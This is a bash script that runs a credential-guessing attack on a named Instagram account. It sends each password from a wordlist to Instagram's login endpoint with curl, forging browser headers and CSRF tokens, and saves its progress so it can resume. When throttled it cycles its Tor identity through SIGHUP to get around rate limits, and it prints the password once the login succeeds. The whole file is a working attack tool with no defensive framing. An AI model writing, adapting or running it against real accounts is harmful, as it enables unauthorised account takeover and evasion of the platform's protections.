#!/usr/bin/env bash
usage() { echo "$0 usage: --help --sleep [seconds between requests] --username <name> --socks-proxy [proxy] --wordlist <wordlist file> --tor-pid [pid]" && grep " .)\ #" "$0"; exit 1; };
[ $# -lt 4 ] && usage;

trap cleanup SIGINT;
cleanup() { printf "\nSIGINT TRAP\nExiting"; exit 1; };

optspec="h:-:"
username="";
proxy="";
pid="";
wordlist="";
token="";
rand="";
sleep=60;

while getopts "$optspec" optchar; do
    case "${optchar}" in
        -)
            val="${!OPTIND}"; OPTIND=$(( OPTIND + 1 ))
            case "${OPTARG}" in
                help)
                    usage;
                    ;;
                username)
                    username="$val";
                    ;;
                sleep)
                    sleep="$val";
                    ;;
                wordlist)
                    wordlist="$val";
                    ;;
                socks-proxy)
                    proxy="$val";
                    ;;
                tor-pid)
                    pid="$val";
                    ;;
                *)
                    if [ "$OPTERR" = 1 ] && [ "${optspec:0:1}" != ":" ]; then
                        echo "Unknown option --${OPTARG}" >&2
                    fi
                    ;;
            esac;;
        h)
            usage;
            ;;
        v)
            echo "Parsing option: '-${optchar}'" >&2
            ;;
        *)
            if [ "$OPTERR" != 1 ] || [ "${optspec:0:1}" = ":" ]; then
                echo "Non-option argument: '-${OPTARG}'" >&2
            fi
            ;;
    esac
done

umask 0022
gen_token() { token=$(head /dev/urandom | base64 | tr -d '[:digit:]' | tr -d '+/=' | tail -c 33); };
gen_rand() { rand=$(head /dev/urandom | base64 | tr -d '[:alpha:]' | tr -d '+/=' | tail -c 11); };
if [ ! -f "$wordlist" ]; then
echo "Non regular wordlist file"
exit 1
fi
if ! which curl &>/dev/null; then
echo "curl not found"
exit 2
fi
ft=$(md5sum < "$wordlist" | cut -d ' ' -f1)
if [ -f "$username"_"$ft" ]; then
echo "Existing Session Found"
line_counter=$(sed '1q;d' "$username"_"$ft")
sedline=$line_counter'q;d'
line=$(sed "$sedline" "$wordlist")
else
touch "$username"_"$ft"
echo "New Session"
line_counter=1;
sedline=$line_counter'q;d'
line=$(sed "$sedline" "$wordlist")
fi
gen_token;
gen_rand;
url='https://www.instagram.com/accounts/login/ajax/'
ct='Content-Type: application/x-www-form-urlencoded'
ac='Accept: */*'
ae='Accept-Encoding: gzip, deflate, br'
ho='Host: www.instagram.com'
or='Origin: https://www.instagram.com'
ua='User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Safari/605.1.15'
re='Referer: https://www.instagram.com/accounts/login/'
co='Connection: keep-alive'
req='X-Requested-With: XMLHttpRequest'
ig='X-IG-WWW-Claim: 0'
size=$(grep '.' -c "$wordlist")
echo "Trying $line_counter of $size";
while :
if [[ "$line_counter" -gt "$size" ]]; then
echo "Password not in wordlist"
exit 5
fi
do
if [ -z "$proxy" ]
then
      response=$(curl -H "$ct" -H "$ac" -H "$ae" -H "$ho" -H "$or" -H "$ua" -H "$re" -H "$co" -H "$req" -H "$ig" -H "X-CSRFToken: $token" --data "username=$username&enc_password=%23PWD_INSTAGRAM_BROWSER%3A0%3A$rand%3A$line&queryParams=%7B%7D&optIntoOneTap=false" --compressed "$url" 2>/dev/null);

else
     response=$(curl --socks5-hostname "$proxy" -H "$ct" -H "$ac" -H "$ae" -H "$ho" -H "$or" -H "$ua" -H "$re" -H "$co" -H "$req" -H "$ig" -H "X-CSRFToken: $token" --data "username=$username&enc_password=%23PWD_INSTAGRAM_BROWSER%3A0%3A$rand%3A$line&queryParams=%7B%7D&optIntoOneTap=false" --compressed "$url" 2>/dev/null);
fi
if [[ $response == *'authenticated":true'* || $response == *'checkpoint_required'* ]]; then
 echo "The Password is $line"
 exit 0
fi
if [[ $response == *'authenticated":false'* ]]; then
 line_counter=$((line_counter+1))
 echo $line_counter > "$username"_"$ft"
 sedline=$line_counter'q;d'
 line=$(sed $sedline "$wordlist")
 echo "Trying $line_counter of $size"
else
if [ -n "$pid" ]
then
    kill -SIGHUP "$pid"
fi
sleep "$sleep"
gen_token;
gen_rand;
fi
done
